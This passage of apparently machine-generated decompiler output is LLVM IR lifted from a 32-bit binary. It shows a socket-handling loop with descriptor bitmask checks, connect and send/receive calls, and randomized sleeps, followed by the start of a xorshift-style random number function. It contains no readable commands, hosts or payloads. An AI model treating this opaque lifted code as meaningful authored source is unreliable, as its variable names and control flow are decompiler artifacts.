dec_label_pc_f9fc:                                ; preds = %dec_label_pc_f9f4
  store i8 0, i8* %stack_var_-38, align 1
  %v2_fa0c = call i32 @function_134c4(i32 %stack_var_-1620.0, i32 6)
  %v2_fa14 = icmp eq i32 %v2_fa0c, 0
  %v1_fa18 = add i32 %stack_var_-1620.0, 1
  store i32 %v1_fa18, i32* %r2.global-to-local, align 4
  br i1 %v2_fa14, label %dec_label_pc_fc74, label %dec_label_pc_fa24

dec_label_pc_fa24:                                ; preds = %dec_label_pc_f9f4, %dec_label_pc_f9fc, %dec_label_pc_fc74
  %stack_var_-37.1 = phi i8 [ 0, %dec_label_pc_fc74 ], [ 0, %dec_label_pc_f9fc ], [ %stack_var_-37.0, %dec_label_pc_f9f4 ]
  %stack_var_-1620.1 = phi i32 [ %v1_fa18, %dec_label_pc_fc74 ], [ %v1_fa18, %dec_label_pc_f9fc ], [ %stack_var_-1620.0, %dec_label_pc_f9f4 ]
  store i32 ptrtoint (i32* @global_var_1ea88.111 to i32), i32* %r3.global-to-local, align 4
  %v2_fa28 = load i32, i32* @global_var_1ea88.111, align 4
  %v7_fa2c = icmp eq i32 %v2_fa28, -1
  br i1 %v7_fa2c, label %dec_label_pc_fa5c, label %dec_label_pc_fa34

dec_label_pc_fa34:                                ; preds = %dec_label_pc_fa24
  %v3_fa34 = udiv i32 %v2_fa28, 32
  %v3_fa3c = mul nuw nsw i32 %v3_fa34, 4
  store i32 %v2_f7a0, i32* @ip, align 4
  %v2_fa44 = add i32 %v3_fa3c, %v2_f7a0
  store i32 %v2_fa44, i32* %r3.global-to-local, align 4
  %v1_fa48 = add i32 %v2_fa44, -556
  %v2_fa48 = inttoptr i32 %v1_fa48 to i32*
  %v3_fa48 = load i32, i32* %v2_fa48, align 4
  %v1_fa4c = urem i32 %v2_fa28, 32
  %v6_fa50 = lshr i32 %v3_fa48, %v1_fa4c
  store i32 %v6_fa50, i32* %r2.global-to-local, align 4
  %v1_fa54 = urem i32 %v6_fa50, 2
  %v2_fa54 = icmp eq i32 %v1_fa54, 0
  br i1 %v2_fa54, label %dec_label_pc_fa5c, label %dec_label_pc_fcf4

dec_label_pc_fa5c:                                ; preds = %dec_label_pc_fa34, %dec_label_pc_fa24
  store i32 ptrtoint (i8** @global_var_1ec28.154 to i32), i32* %r3.global-to-local, align 4
  %v2_fa60 = load i8, i8* bitcast (i8** @global_var_1ec28.154 to i8*), align 4
  %v3_fa60 = zext i8 %v2_fa60 to i32
  store i32 %v3_fa60, i32* @r4, align 4
  %v2_fa64 = icmp eq i8 %v2_fa60, 0
  %v2_faf4 = load i32, i32* @global_var_1ea8c.151, align 4
  br i1 %v2_fa64, label %dec_label_pc_faf4, label %dec_label_pc_fa6c

dec_label_pc_fa6c:                                ; preds = %dec_label_pc_fa5c
  %v3_fa74 = udiv i32 %v2_faf4, 32
  %v3_fa7c = mul nuw nsw i32 %v3_fa74, 4
  %v2_fa80 = add i32 %v3_fa7c, %v2_f7a0
  store i32 %v2_fa80, i32* %r3.global-to-local, align 4
  %v1_fa84 = add i32 %v2_fa80, -300
  %v2_fa84 = inttoptr i32 %v1_fa84 to i32*
  %v3_fa84 = load i32, i32* %v2_fa84, align 4
  %v1_fa88 = urem i32 %v2_faf4, 32
  %v6_fa8c = lshr i32 %v3_fa84, %v1_fa88
  store i32 %v6_fa8c, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i8** @global_var_1ec28.154 to i32), i32* %r3.global-to-local, align 4
  %v1_fa98 = urem i32 %v6_fa8c, 2
  %v2_fa98 = icmp eq i32 %v1_fa98, 0
  store i8 0, i8* bitcast (i8** @global_var_1ec28.154 to i8*), align 4
  store i32 ptrtoint (i32* @global_var_1ea8c.151 to i32), i32* @r5, align 4
  br i1 %v2_fa98, label %dec_label_pc_faa8, label %dec_label_pc_fc94

dec_label_pc_faa8:                                ; preds = %dec_label_pc_fa6c
  store i32 64176, i32* @lr, align 4
  %v1_faac = icmp ne i32 %v2_faf4, -1
  call void @__pseudo_cond_branch(i1 %v1_faac, i32 ptrtoint (i32* @global_var_1369c.26 to i32))
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_fab4 = load i32, i32* @r5, align 4
  %v2_fab4 = inttoptr i32 %v1_fab4 to i32*
  store i32 -1, i32* %v2_fab4, align 4
  %v1_fabc = call i32 @function_14ac4(i32 1)
  br label %dec_label_pc_f8f4.backedge

dec_label_pc_fac4:                                ; preds = %dec_label_pc_f96c
  store i32 %v2_f7a0, i32* %r2.global-to-local, align 4
  %v3_fad4 = mul nuw nsw i32 %v3_facc, 4
  %v2_fad8 = add i32 %v3_fad4, %v2_f7a0
  store i32 %v2_fad8, i32* %r3.global-to-local, align 4
  %v1_fadc = add i32 %v2_fad8, -556
  %v2_fadc = inttoptr i32 %v1_fadc to i32*
  %v3_fadc = load i32, i32* %v2_fadc, align 4
  %v1_fae0 = urem i32 %v2_fac4, 32
  %v7_fae8 = shl i32 1, %v1_fae0
  %v8_fae8 = or i32 %v3_fadc, %v7_fae8
  store i32 %v8_fae8, i32* %r2.global-to-local, align 4
  store i32 %v8_fae8, i32* %v2_fadc, align 4
  br label %dec_label_pc_f9a8

dec_label_pc_faf4:                                ; preds = %dec_label_pc_fa5c
  %v7_faf8 = icmp eq i32 %v2_faf4, -1
  store i32 ptrtoint (i32* @global_var_1ea8c.151 to i32), i32* @r5, align 4
  br i1 %v7_faf8, label %dec_label_pc_f8f4.backedge, label %dec_label_pc_fb04

dec_label_pc_fb04:                                ; preds = %dec_label_pc_faf4
  %v3_fb04 = udiv i32 %v2_faf4, 32
  store i32 %v2_f7a0, i32* %r2.global-to-local, align 4
  %v3_fb10 = mul nuw nsw i32 %v3_fb04, 4
  %v2_fb14 = add i32 %v3_fb10, %v2_f7a0
  store i32 %v2_fb14, i32* %r3.global-to-local, align 4
  %v1_fb18 = add i32 %v2_fb14, -556
  %v2_fb18 = inttoptr i32 %v1_fb18 to i32*
  %v3_fb18 = load i32, i32* %v2_fb18, align 4
  %v1_fb1c = urem i32 %v2_faf4, 32
  %v6_fb20 = lshr i32 %v3_fb18, %v1_fb1c
  store i32 %v6_fb20, i32* %r2.global-to-local, align 4
  %v1_fb24 = urem i32 %v6_fb20, 2
  %v2_fb24 = icmp eq i32 %v1_fb24, 0
  br i1 %v2_fb24, label %dec_label_pc_f8f4.backedge, label %dec_label_pc_fb2c

dec_label_pc_fb2c:                                ; preds = %dec_label_pc_fb04
  %v0_fb2c = call i32 @function_13c70()
  %v0_fb30 = load i32, i32* @r4, align 4
  %v2_fb30 = inttoptr i32 %v0_fb2c to i32*
  store i32 %v0_fb30, i32* %v2_fb30, align 4
  store i32 %v0_fb2c, i32* @r8, align 4
  store i32 16386, i32* %r3.global-to-local, align 4
  %v2_fb44 = load i32, i32* @global_var_1ea8c.151, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v5_fb50 = call i32 @function_13ea0(i32 %v2_fb44, i32* %v5_fc8c, i32 2, i32 16386)
  %v7_fb54 = icmp eq i32 %v5_fb50, -1
  br i1 %v7_fb54, label %dec_label_pc_fd94, label %dec_label_pc_fb5c

dec_label_pc_fb5c:                                ; preds = %dec_label_pc_fb2c
  %v2_fb5c = icmp eq i32 %v5_fb50, 0
  br i1 %v2_fb5c, label %dec_label_pc_fbe0, label %dec_label_pc_fb64

dec_label_pc_fb64:                                ; preds = %dec_label_pc_fb5c
  %v3_fb64 = load i8, i8* %stack_var_-38, align 1
  %v4_fb64 = sext i8 %v3_fb64 to i32
  %v4_fb68 = zext i8 %stack_var_-37.1 to i32
  store i32 %v4_fb68, i32* %r3.global-to-local, align 4
  %v4_fb6c = mul nuw nsw i32 %v4_fb68, 256
  %v5_fb6c = or i32 %v4_fb64, %v4_fb6c
  store i32 %v5_fb6c, i32* %r2.global-to-local, align 4
  %v7_fb6c = icmp eq i32 %v5_fb6c, 0
  br i1 %v7_fb6c, label %dec_label_pc_fda8, label %dec_label_pc_fb74

dec_label_pc_fb74:                                ; preds = %dec_label_pc_fb64
  %v1_fb74 = mul nsw i32 %v4_fb64, 256
  %v3_fb78 = and i32 %v1_fb74, 65280
  %v4_fb7c = udiv i32 %v5_fb6c, 256
  %v5_fb7c = or i32 %v3_fb78, %v4_fb7c
  store i32 %v5_fb7c, i32* %r3.global-to-local, align 4
  %v3_fb804 = udiv i32 %v5_fb7c, 256
  store i32 %v3_fb804, i32* %r2.global-to-local, align 4
  %v1_fb88 = trunc i32 %v3_fb804 to i8
  %v6_fb8c = trunc i32 %v4_fb7c to i8
  store i8 %v6_fb8c, i8* %stack_var_-38, align 1
  %tmp103 = icmp ult i32 %v5_fb7c, 1025
  br i1 %tmp103, label %dec_label_pc_fba4, label %dec_label_pc_fb94

dec_label_pc_fb94:                                ; preds = %dec_label_pc_fb74
  %v2_fb94 = load i32, i32* @global_var_1ea8c.151, align 4
  %v1_fb98 = call i32 @function_1369c(i32 %v2_fb94)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_fba0 = load i32, i32* @r5, align 4
  %v2_fba0 = inttoptr i32 %v1_fba0 to i32*
  store i32 -1, i32* %v2_fba0, align 4
  %v3_fbac.pre = load i8, i8* %stack_var_-38, align 1
  br label %dec_label_pc_fba4

dec_label_pc_fba4:                                ; preds = %dec_label_pc_fb74, %dec_label_pc_fb94
  %v3_fbac = phi i8 [ %v6_fb8c, %dec_label_pc_fb74 ], [ %v3_fbac.pre, %dec_label_pc_fb94 ]
  %v0_fba4 = load i32, i32* @r4, align 4
  %v1_fba4 = load i32, i32* @r8, align 4
  %v2_fba4 = inttoptr i32 %v1_fba4 to i32*
  store i32 %v0_fba4, i32* %v2_fba4, align 4
  %v4_fba8 = urem i32 %v3_fb804, 256
  %v4_fbac = sext i8 %v3_fbac to i32
  store i32 %v2_fbb4, i32* @r4, align 4
  %v4_fbbc = mul nuw nsw i32 %v4_fba8, 256
  %v5_fbbc = or i32 %v4_fbac, %v4_fbbc
  store i32 %v5_fbbc, i32* %r2.global-to-local, align 4
  store i32 16386, i32* %r3.global-to-local, align 4
  %v2_fbc4 = load i32, i32* @global_var_1ea8c.151, align 4
  %v5_fbcc = call i32 @function_13ea0(i32 %v2_fbc4, i32* nonnull %stack_var_-1616, i32 %v5_fbbc, i32 16386)
  %v7_fbd0 = icmp eq i32 %v5_fbcc, -1
  br i1 %v7_fbd0, label %dec_label_pc_fd94, label %dec_label_pc_fbd8

dec_label_pc_fbd8:                                ; preds = %dec_label_pc_fba4
  %v2_fbd8 = icmp eq i32 %v5_fbcc, 0
  br i1 %v2_fbd8, label %dec_label_pc_fbe0, label %dec_label_pc_fdc4

dec_label_pc_fbe0:                                ; preds = %bb86, %dec_label_pc_fbd8, %dec_label_pc_fb5c
  %stack_var_-37.2 = phi i8 [ %stack_var_-37.3, %bb86 ], [ %stack_var_-37.1, %dec_label_pc_fb5c ], [ %v1_fb88, %dec_label_pc_fbd8 ]
  %v2_fbe0 = load i32, i32* @global_var_1ea8c.151, align 4
  store i32 64492, i32* @lr, align 4
  %v1_fbe8 = icmp ne i32 %v2_fbe0, -1
  call void @__pseudo_cond_branch(i1 %v1_fbe8, i32 ptrtoint (i32* @global_var_1369c.26 to i32))
  store i32 ptrtoint (i32* @global_var_1ea8c.151 to i32), i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  store i32 -1, i32* @global_var_1ea8c.151, align 4
  %v1_fbfc = call i32 @function_14ac4(i32 1)
  br label %dec_label_pc_f8f4.backedge

dec_label_pc_f8f4.backedge:                       ; preds = %dec_label_pc_fbe0, %dec_label_pc_fccc, %dec_label_pc_fd80, %dec_label_pc_fda8, %dec_label_pc_fe18, %dec_label_pc_faa8, %dec_label_pc_fd34, %bb86, %dec_label_pc_fdc4, %bb84, %dec_label_pc_faf4, %dec_label_pc_fb04, %dec_label_pc_fd94
  %stack_var_-37.0.be = phi i8 [ %stack_var_-37.0, %bb84 ], [ %stack_var_-37.1, %dec_label_pc_faf4 ], [ %stack_var_-37.1, %dec_label_pc_fb04 ], [ %stack_var_-37.3, %bb86 ], [ %stack_var_-37.2, %dec_label_pc_fbe0 ], [ %stack_var_-37.1, %dec_label_pc_fda8 ], [ %v3_fddc, %dec_label_pc_fdc4 ], [ %v3_fddc, %dec_label_pc_fe18 ], [ %stack_var_-37.1, %dec_label_pc_faa8 ], [ %stack_var_-37.1, %dec_label_pc_fd34 ], [ %stack_var_-37.1, %dec_label_pc_fd80 ], [ %stack_var_-37.1, %dec_label_pc_fccc ], [ %stack_var_-37.3, %dec_label_pc_fd94 ]
  %stack_var_-1620.0.be = phi i32 [ %stack_var_-1620.0, %bb84 ], [ %stack_var_-1620.1, %dec_label_pc_faf4 ], [ %stack_var_-1620.1, %dec_label_pc_fb04 ], [ %stack_var_-1620.1, %bb86 ], [ %stack_var_-1620.1, %dec_label_pc_fbe0 ], [ %stack_var_-1620.1, %dec_label_pc_fda8 ], [ %stack_var_-1620.1, %dec_label_pc_fdc4 ], [ %stack_var_-1620.1, %dec_label_pc_fe18 ], [ %stack_var_-1620.1, %dec_label_pc_faa8 ], [ %stack_var_-1620.1, %dec_label_pc_fd34 ], [ %stack_var_-1620.1, %dec_label_pc_fd80 ], [ %stack_var_-1620.1, %dec_label_pc_fccc ], [ %stack_var_-1620.1, %dec_label_pc_fd94 ]
  %v2_f8fc87.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_f8f4

dec_label_pc_fc04:                                ; preds = %dec_label_pc_f95c
  %v0_fc0c = load i32, i32* @r4, align 4
  store i32 %v0_fc0c, i32* %r2.global-to-local, align 4
  %v3_fc10 = call i32 @function_13f90(i32 2, i32 1, i32 %v0_fc0c)
  %v7_fc14 = icmp eq i32 %v3_fc10, -1
  store i32 %v3_fc10, i32* %r5.global-to-local, align 4
  %v1_fc1c = load i32, i32* %r8.global-to-local, align 4
  %v2_fc1c = inttoptr i32 %v1_fc1c to i32*
  store i32 %v3_fc10, i32* %v2_fc1c, align 4
  br i1 %v7_fc14, label %dec_label_pc_f96c, label %dec_label_pc_fc24

dec_label_pc_fc24:                                ; preds = %dec_label_pc_fc04
  %v0_fc24 = load i32, i32* @r4, align 4
  store i32 %v0_fc24, i32* @r2, align 4
  %v2_fc2c = call i32 @function_135ac(i32 %v3_fc10, i32 3)
  %v1_fc34 = or i32 %v2_fc2c, 2048
  store i32 %v1_fc34, i32* @r2, align 4
  %v0_fc38 = load i32, i32* %r5.global-to-local, align 4
  %v2_fc3c = call i32 @function_135ac(i32 %v0_fc38, i32 4)
  %v2_fc44 = load i32, i32* @global_var_1ea90.109, align 4
  store i32 %v2_fc44, i32* %r3.global-to-local, align 4
  %v2_fc48 = icmp eq i32 %v2_fc44, 0
  br i1 %v2_fc48, label %.thread, label %bb85

bb85:                                             ; preds = %dec_label_pc_fc24
  call void @__pseudo_branch(i32 ptrtoint (i32* @global_var_12f94.156 to i32))
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_fc24, %bb85
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_fc5c = load i32, i32* @global_var_1ea8c.151, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i8 1, i8* bitcast (i8** @global_var_1ec28.154 to i8*), align 4
  %v5_fc6c = call i32 @function_13dec(i32 %v2_fc5c, %sockaddr* bitcast (i8** @global_var_1ecc4.116 to %sockaddr*), i32 16)
  br label %dec_label_pc_f96c

dec_label_pc_fc74:                                ; preds = %dec_label_pc_f9fc
  %v2_fc7c = load i32, i32* @global_var_1ea8c.151, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v6_fc8c = call i32 @function_13f00(i32 %v2_fc7c, i32* nonnull %v5_fc8c, i32 2, i32 16384)
  br label %dec_label_pc_fa24

dec_label_pc_fc94:                                ; preds = %dec_label_pc_fa6c
  store i32 4, i32* @r4, align 4
  store i32 0, i32* %stack_var_-48, align 4
  store i32 %v2_fca4, i32* %r3.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 4, i32* %stack_var_-52, align 4
  %v6_fcbc = call i32 @function_13e44(i32 %v2_faf4, i32 1, i32 4, i32* nonnull %stack_var_-48, i32 %v2_fca8)
  %v3_fcc0 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_fcc0, i32* %r3.global-to-local, align 4
  %v2_fcc4 = icmp eq i32 %v3_fcc0, 0
  br i1 %v2_fcc4, label %dec_label_pc_fd34, label %dec_label_pc_fccc

dec_label_pc_fccc:                                ; preds = %dec_label_pc_fc94
  %v2_fccc = load i32, i32* @global_var_1ea8c.151, align 4
  %v1_fcd0 = call i32 @function_1369c(i32 %v2_fccc)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_fcd8 = load i32, i32* @r5, align 4
  %v2_fcd8 = inttoptr i32 %v1_fcd8 to i32*
  store i32 -1, i32* %v2_fcd8, align 4
  %v0_fcdc = call i32 @function_fe60()
  %v2_fce4 = call i32 @function_133f8(i32 %v0_fcdc, i32 10)
  %v1_fce8 = add i32 %v2_fce4, 1
  %v1_fcec = call i32 @function_14ac4(i32 %v1_fce8)
  br label %dec_label_pc_f8f4.backedge

dec_label_pc_fcf4:                                ; preds = %dec_label_pc_fa34
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 %v2_fca4, i32* %r2.global-to-local, align 4
  store i32 16, i32* %stack_var_-48, align 4
  %v6_fd0c = call i32 @function_13d94(i32 %v2_fa28, %sockaddr* %v5_fd0c, i32 %v2_fca4, i32 16, i32 16)
  %v1_fd10 = call i32 @function_10690(i32 %v6_fd0c)
  %v1_fd14 = call i32 @function_e530(i32 %v1_fd10)
  %v1_fd18 = call i32 @function_a32c(i32 %v1_fd14)
  store i32 %v1_f8b0, i32* %r2.global-to-local, align 4
  %v2_fd28 = call i32 @function_1379c(i32 %v1_fd24, i32 9)
  %v1_fd30 = call i32 @function_14a30(i32 0)
  br label %dec_label_pc_fd34

dec_label_pc_fd34:                                ; preds = %dec_label_pc_fc94, %dec_label_pc_fcf4
  %v2_fd38 = call i32 @function_12cdc(i8* %v1_fd38)
  %v3_fd38 = trunc i32 %v2_fd38 to i8
  store i8 %v3_fd38, i8* %stack_var_-38, align 1
  %v0_fd40 = call i32 @function_12f94()
  %v0_fd44 = load i32, i32* @r4, align 4
  store i32 %v0_fd44, i32* %r2.global-to-local, align 4
  %v1_fd48 = load i32, i32* @fp, align 4
  %v2_fd48 = inttoptr i32 %v1_fd48 to i32*
  store i32 %v0_fd40, i32* %v2_fd48, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_fd54 = load i32, i32* @r5, align 4
  %v1_fd54 = inttoptr i32 %v0_fd54 to i32*
  %v2_fd54 = load i32, i32* %v1_fd54, align 4
  %v5_fd58 = call i32 @function_13f00(i32 %v2_fd54, i32* nonnull @global_var_15fd8.158, i32 %v0_fd44, i32 16384)
  store i32 1, i32* %r2.global-to-local, align 4
  %v0_fd64 = load i32, i32* @r5, align 4
  %v1_fd64 = inttoptr i32 %v0_fd64 to i32*
  %v2_fd64 = load i32, i32* %v1_fd64, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_fd70 = call i32 @function_13f00(i32 %v2_fd64, i32* %v5_fc8c, i32 1, i32 16384)
  %v3_fd74 = load i8, i8* %stack_var_-38, align 1
  %v4_fd74 = sext i8 %v3_fd74 to i32
  store i32 %v4_fd74, i32* %r2.global-to-local, align 4
  %v2_fd78 = icmp eq i8 %v3_fd74, 0
  br i1 %v2_fd78, label %dec_label_pc_f8f4.backedge, label %dec_label_pc_fd80

dec_label_pc_fd80:                                ; preds = %dec_label_pc_fd34
  %v0_fd80 = load i32, i32* @r5, align 4
  %v1_fd80 = inttoptr i32 %v0_fd80 to i32*
  %v2_fd80 = load i32, i32* %v1_fd80, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_fd8c = call i32 @function_13f00(i32 %v2_fd80, i32* nonnull %stack_var_-138, i32 %v4_fd74, i32 16384)
  br label %dec_label_pc_f8f4.backedge

dec_label_pc_fd94:                                ; preds = %dec_label_pc_fb2c, %dec_label_pc_fba4
  %stack_var_-37.3 = phi i8 [ %stack_var_-37.1, %dec_label_pc_fb2c ], [ %v1_fb88, %dec_label_pc_fba4 ]
  %v0_fd94 = load i32, i32* @r8, align 4
  %v1_fd94 = inttoptr i32 %v0_fd94 to i32*
  %v2_fd94 = load i32, i32* %v1_fd94, align 4
  store i32 %v2_fd94, i32* %r3.global-to-local, align 4
  %v7_fd98 = icmp eq i32 %v2_fd94, 4
  br i1 %v7_fd98, label %dec_label_pc_f8f4.backedge, label %bb86

bb86:                                             ; preds = %dec_label_pc_fd94
  %v8_fd9c = icmp eq i32 %v2_fd94, 11
  br i1 %v8_fd9c, label %dec_label_pc_f8f4.backedge, label %dec_label_pc_fbe0

dec_label_pc_fda8:                                ; preds = %dec_label_pc_fb64
  %v2_fdac = load i32, i32* @global_var_1ea8c.151, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_fdbc = call i32 @function_13ea0(i32 %v2_fdac, i32* nonnull %v5_fc8c, i32 2, i32 16384)
  br label %dec_label_pc_f8f4.backedge

dec_label_pc_fdc4:                                ; preds = %dec_label_pc_fbd8
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v2_fdd4 = load i32, i32* @global_var_1ea8c.151, align 4
  %v5_fdd8 = call i32 @function_13ea0(i32 %v2_fdd4, i32* nonnull %v5_fc8c, i32 2, i32 16384)
  %v3_fddc = load i8, i8* %stack_var_-38, align 1
  %v4_fddc = sext i8 %v3_fddc to i32
  %v4_fde4 = mul nsw i32 %v4_fddc, 256
  %v5_fde4 = or i32 %v4_fde4, %v4_fba8
  store i32 %v5_fde4, i32* %r2.global-to-local, align 4
  store i32 %v4_fddc, i32* @lr, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v2_fdf8 = load i32, i32* @global_var_1ea8c.151, align 4
  store i8 %v1_fb88, i8* %stack_var_-38, align 1
  %v8_fe04 = call i32 @function_13ea0(i32 %v2_fdf8, i32* nonnull %stack_var_-1616, i32 %v5_fde4, i32 16384)
  %v3_fe08 = load i8, i8* %stack_var_-38, align 1
  %v4_fe08 = sext i8 %v3_fe08 to i32
  store i32 %v4_fe08, i32* %r2.global-to-local, align 4
  %v4_fe0c = zext i8 %v3_fddc to i32
  store i32 %v4_fe0c, i32* %r3.global-to-local, align 4
  %v4_fe10 = mul nuw nsw i32 %v4_fe0c, 256
  %v5_fe10 = or i32 %v4_fe08, %v4_fe10
  %v7_fe10 = icmp eq i32 %v5_fe10, 0
  br i1 %v7_fe10, label %dec_label_pc_f8f4.backedge, label %dec_label_pc_fe18

dec_label_pc_fe18:                                ; preds = %dec_label_pc_fdc4
  %v5_fe1c = call i32 @function_a0d8(i32* nonnull %stack_var_-1616, i32 %v5_fe10, i32 %v4_fe08, i32 %v4_fe0c)
  br label %dec_label_pc_f8f4.backedge

; uselistorder directives
  uselistorder i32 %v4_fe0c, { 1, 0, 2 }
  uselistorder i32 %v4_fe08, { 1, 0, 2 }
  uselistorder i32 %v4_fddc, { 1, 0 }
  uselistorder i8 %v3_fddc, { 2, 3, 1, 0 }
  uselistorder i8 %stack_var_-37.3, { 2, 1, 0 }
  uselistorder i32 %v3_fc10, { 3, 2, 1, 0 }
  uselistorder i32 %v5_fbcc, { 1, 0 }
  uselistorder i32 %v4_fba8, { 1, 0 }
  uselistorder i8 %v1_fb88, { 0, 2, 1 }
  uselistorder i32 %v3_fb804, { 0, 2, 1 }
  uselistorder i32 %v4_fb7c, { 1, 0 }
  uselistorder i32 %v5_fb50, { 1, 0 }
  uselistorder i32 %v2_faf4, { 6, 3, 2, 0, 1, 5, 4 }
  uselistorder i32 %v2_fa28, { 3, 2, 1, 0 }
  uselistorder i8 %stack_var_-37.1, { 9, 0, 1, 2, 3, 4, 5, 6, 8, 7 }
  uselistorder i32 %v5_f9e4, { 2, 1, 0 }
  uselistorder i32 %v2_f928, { 2, 1, 0 }
  uselistorder i32 %v1_f918, { 1, 2, 0 }
  uselistorder i32 %v1_f900, { 1, 2, 0 }
  uselistorder i32 %stack_var_-1620.0, { 0, 2, 1, 3 }
  uselistorder i32 %v2_fca4, { 1, 0, 2 }
  uselistorder i32* %v5_fc8c, { 3, 2, 0, 4, 1 }
  uselistorder i32 %v2_f8f0, { 1, 0, 2 }
  uselistorder i32 %v2_f8ec, { 1, 0, 2 }
  uselistorder i32 %v4_f858, { 1, 2, 0 }
  uselistorder i32 %v2_f7a0, { 0, 10, 1, 11, 2, 3, 9, 4, 5, 8, 6, 12, 7 }
  uselistorder i32 %v1_f6ec, { 1, 2, 0 }
  uselistorder i32 %v0_f6e8, { 1, 0 }
  uselistorder i32 %v1_f6bc, { 1, 0 }
  uselistorder i32 %v0_f6b0, { 1, 0 }
  uselistorder i32 %v1_f688, { 1, 0 }
  uselistorder i32 %v0_f67c, { 1, 0 }
  uselistorder i32 %v1_f654, { 1, 0 }
  uselistorder i32 %v0_f648, { 1, 0 }
  uselistorder i32 %v1_f620, { 1, 0 }
  uselistorder i32 %v0_f610, { 1, 0 }
  uselistorder i32 %v0_f5ec, { 1, 0 }
  uselistorder i32 %v2_f528, { 0, 2, 1 }
  uselistorder i32 %v4_f4c8, { 1, 2, 0 }
  uselistorder i32 %v2_f470, { 1, 0, 3, 2, 4 }
  uselistorder i32* %stack_var_-36, { 0, 2, 3, 1 }
  uselistorder i32* %stack_var_-48, { 1, 2, 0, 3, 5, 4, 6 }
  uselistorder i8* %stack_var_-106, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
  uselistorder i32* %stack_var_-138, { 1, 2, 0, 3 }
  uselistorder i8* %stack_var_-38, { 9, 8, 7, 6, 5, 0, 4, 3, 2, 1 }
  uselistorder i32* %stack_var_-1616, { 1, 0, 2, 3 }
  uselistorder i8 %tmp37, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r3.global-to-local, { 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 40, 41, 24, 25, 21, 38, 39, 22, 23, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37 }
  uselistorder i32* %r2.global-to-local, { 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i32* @global_var_1ea90.109, { 1, 0 }
  uselistorder i32 16386, { 1, 0, 2, 4, 3, 5 }
  uselistorder i8* bitcast (i8** @global_var_1ec28.154 to i8*), { 0, 1, 3, 2 }
  uselistorder i8** @global_var_1ec28.154, { 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_1ec28.154 to i32), { 2, 1, 0 }
  uselistorder i32* @global_var_1ea88.111, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9 }
  uselistorder i32* @global_var_1ea8c.151, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9, 10, 11, 13, 12, 14, 15 }
  uselistorder i32 (i8*, i32)* @function_12d04, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 28, 27, 29, 30, 31, 32, 33, 34, 35, 66, 36, 37, 38, 39, 40, 61, 62, 63, 64, 65, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60 }
  uselistorder i32 (i32, i32)* @function_ff14, { 2, 1, 0 }
  uselistorder i32 ()* @function_f260, { 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_1ecc4.116 to i32), { 1, 0 }
  uselistorder [2 x i8]* @global_var_15f60.23, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_f248.121 to i32), { 0, 2, 1 }
  uselistorder i32 (i32, i32)* @function_1401c, { 1, 0 }
  uselistorder label %dec_label_pc_fd94, { 1, 0 }
  uselistorder label %dec_label_pc_fd34, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_f8f4.backedge, { 4, 8, 3, 7, 12, 2, 6, 1, 0, 11, 10, 5, 9 }
  uselistorder label %dec_label_pc_fba4, { 1, 0 }
  uselistorder label %dec_label_pc_fa24, { 2, 1, 0 }
  uselistorder label %bb84, { 1, 0 }
  uselistorder label %dec_label_pc_f96c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_f95c, { 1, 0 }
  uselistorder label %dec_label_pc_f914.dec_label_pc_f914_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_f8fc.dec_label_pc_f8fc_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_f778, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f754, { 2, 0, 1 }
}

define i32 @function_fe60() local_unnamed_addr {
dec_label_pc_fe60:
  %v2_fe6c = load i32, i32* @global_var_1ec2c.160, align 4
  %v2_fe70 = load i32, i32* @global_var_1ec38.162, align 4
  store i32 ptrtoint (i32* @global_var_1ec30.164 to i32), i32* @lr, align 4
  %v4_fe7c = mul i32 %v2_fe6c, 2048
  %v5_fe7c = xor i32 %v4_fe7c, %v2_fe6c
  %v4_fe80 = udiv i32 %v2_fe70, 524288
  %v5_fe80 = xor i32 %v4_fe80, %v2_fe70
